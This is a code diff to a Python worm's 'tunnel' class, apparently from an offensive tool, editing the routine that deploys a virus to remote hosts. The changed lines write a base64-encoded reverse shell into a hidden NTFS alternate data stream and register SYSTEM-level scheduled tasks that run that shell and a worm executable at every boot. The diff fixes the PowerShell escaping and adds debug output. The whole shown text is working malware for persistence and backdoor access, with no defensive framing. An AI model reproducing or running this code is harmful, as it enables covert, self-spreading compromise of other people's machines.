@@ -28,7 +28,7 @@ class tunnel(threading.Thread):
         else:
             dir = "/tmp/"
         self.deploy_virus(self.worm.getfiledata(),conn, osplatform, dir)
-        self.create_persistence_windows(conn, dir)
+        self.create_persistence_windows(conn, osplatform, dir, filename="hello.txt")
         conn.close()
     
     
@@ -111,7 +111,7 @@ class tunnel(threading.Thread):
             return ""
         else:
             return ""
-    def create_persistence_windows(self, conn, dir,filename="hello.txt"):
+    def create_persistence_windows(self, conn, ostype, dir,filename):
         #creating a backdoor access on the remote server
         command = 'Set-Content -path "{}/{}:hidden" -Value "'.format(dir,filename).encode()
         command += self.generate_base64_reverse_shell_code("windows").encode()
@@ -122,7 +122,7 @@ class tunnel(threading.Thread):
         time.sleep(8)
         print(self.get_response(conn,4096))
         
-        command = 'schtasks /create /tn "reminderr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "powershell -Command \"$command=get-content {}/{}:hidden; powershell -encodedcommand $command\""'.format(dir,filename)
+        command = 'schtasks /create /tn "reminderr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "powershell -Command \"`$command`=get-content {}/{}:hidden; powershell -encodedcommand `$command`\""'.format(dir,filename).encode()
         command+=b"\n"
         self.sent_command(command,conn)
         print("Create a Schedule Tasks to Start the reverse Shell on Boot")
@@ -176,8 +176,9 @@ class tunnel(threading.Thread):
             command = 'schtasks /create /tn "scannerr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "{}/{}_tworm.exe";'.format(dir,self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
-            time.sleep(2)
+            time.sleep(3)
             tasks_response = self.get_response(conn,1024)
+            print("Target Response: {}".format(tasks_response))
             if "already exists" in tasks_response:
                 command = b'Y'
                 command+=b'\n'
